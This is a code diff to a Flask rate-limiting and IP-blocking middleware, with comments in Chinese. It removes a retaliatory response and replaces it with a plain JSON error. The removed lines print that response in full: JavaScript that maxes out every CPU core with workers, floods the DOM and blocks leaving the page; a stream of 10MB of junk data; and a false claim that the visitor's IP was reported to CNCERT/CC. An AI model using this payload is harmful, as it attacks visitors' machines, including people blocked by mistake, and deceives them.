@@ -1,11 +1,10 @@
 import logging
 import os
 import requests
-from flask import request, abort, make_response, Response
+from flask import request, jsonify
 from dotenv import load_dotenv
 from collections import defaultdict, deque
 import time
-import random
 
 # 记录被拦截次数
 ip_block_counts = defaultdict(int)
@@ -24,60 +23,6 @@ NOT_FOUND_WINDOW = 60     # 滑动窗口大小（秒）
 ip_req_times = defaultdict(deque)
 RATE_LIMIT_THRESHOLD = 60  # 窗口内最大请求数
 RATE_LIMIT_WINDOW = 60     # 滑动窗口大小（秒）
-
-# --- 垃圾数据流配置 ---
-JUNK_TOTAL_SIZE = 10 * 1024 * 1024   # 总共发送 10MB 垃圾数据
-JUNK_CHUNK_SIZE = 64 * 1024          # 每块 64KB（服务器内存占用极小）
-
-# --- 自定义警告响应模板 ---
-WARNING_TEMPLATE = """<!DOCTYPE html>
-<html><head><title>Nice Try</title></head>
-<body style="font-family:monospace;padding:2em;background:#0a0a0a;color:#ff3333">
-<pre style="color:#ff3333">
- ██     ██  █████  ██████  ███    ██ ██ ███    ██  ██████
- ██     ██ ██   ██ ██   ██ ████   ██ ██ ████   ██ ██
- ██  █  ██ ███████ ██████  ██ ██  ██ ██ ██ ██  ██ ██   ███
- ██ ███ ██ ██   ██ ██   ██ ██  ██ ██ ██ ██  ██ ██ ██    ██
-  ███ ███  ██   ██ ██   ██ ██   ████ ██ ██   ████  ██████
-</pre>
-<h2>Oops. You've been caught.</h2>
-<p>Your IP address <strong>{ip}</strong> has been logged and reported
-to the National Internet Emergency Center (CNCERT/CC).</p>
-<p>All request fingerprints, timestamps, and payloads from this session
-have been archived for forensic analysis.</p>
-<hr style="border-color:#333">
-<p style="color:#ff6666"><strong>Reason:</strong> {reason}</p>
-<p style="color:#888">If you believe this is a mistake, it probably isn't.
-But feel free to keep trying &mdash; we enjoy watching.</p>
-<script>
-(function(){{
-  // Spawn workers to saturate all CPU cores
-  var blob = new Blob([
-    'while(true){{ var a=new ArrayBuffer(1<<20);' +
-    'var v=new Uint32Array(a);' +
-    'for(var i=0;i<v.length;i++)v[i]=v[i]^(i*2654435761>>>0); }}'
-  ], {{type:'application/javascript'}});
-  var url = URL.createObjectURL(blob);
-  var n = navigator.hardwareConcurrency || 8;
-  for (var i = 0; i < n; i++) new Worker(url);
-  // Main thread: recursive RAF + DOM flood
-  function burn() {{
-    for (var j = 0; j < 200; j++) {{
-      var d = document.createElement('div');
-      d.textContent = Math.random().toString(36);
-      document.body.appendChild(d);
-    }}
-    requestAnimationFrame(burn);
-  }}
-  burn();
-  // Block tab close with repeated history pushes
-  history.pushState(null, '', location.href);
-  window.addEventListener('popstate', function() {{
-    history.pushState(null, '', location.href);
-  }});
-}})();
-</script>
-</body></html>"""
 
 load_dotenv()
 
@@ -172,26 +117,15 @@ def _sliding_window_count(dq, window):
     dq.append(now)
     return len(dq)
 
-def _junk_generator(html):
-    """先发送 HTML 警告，然后流式追加垃圾数据消耗扫描器带宽。"""
-    yield html.encode("utf-8")
-    # HTML 注释包裹垃圾数据，浏览器不会渲染但 curl 会持续接收
-    yield b"\n<!-- "
-    sent = 0
-    while sent < JUNK_TOTAL_SIZE:
-        chunk = random.randbytes(JUNK_CHUNK_SIZE)
-        yield chunk
-        sent += JUNK_CHUNK_SIZE
-    yield b" -->\n"
-
 def _warning_response(ip, status_code, reason):
-    """返回自定义 HTML 警告 + 流式垃圾数据响应。"""
-    html = WARNING_TEMPLATE.format(ip=ip, reason=reason)
-    return Response(
-        _junk_generator(html),
-        status=status_code,
-        content_type="text/html; charset=utf-8",
-    )
+    """对被拦截的请求返回最小化 JSON 响应，仅服务端记录细节。"""
+    return jsonify({
+        "error": "Forbidden" if status_code == 403 else (
+            "RateLimitExceeded" if status_code == 429 else "NotFound"
+        ),
+        "code": status_code,
+        "message": reason,
+    }), status_code
 
 def register_llm_security(app):
     @app.before_request
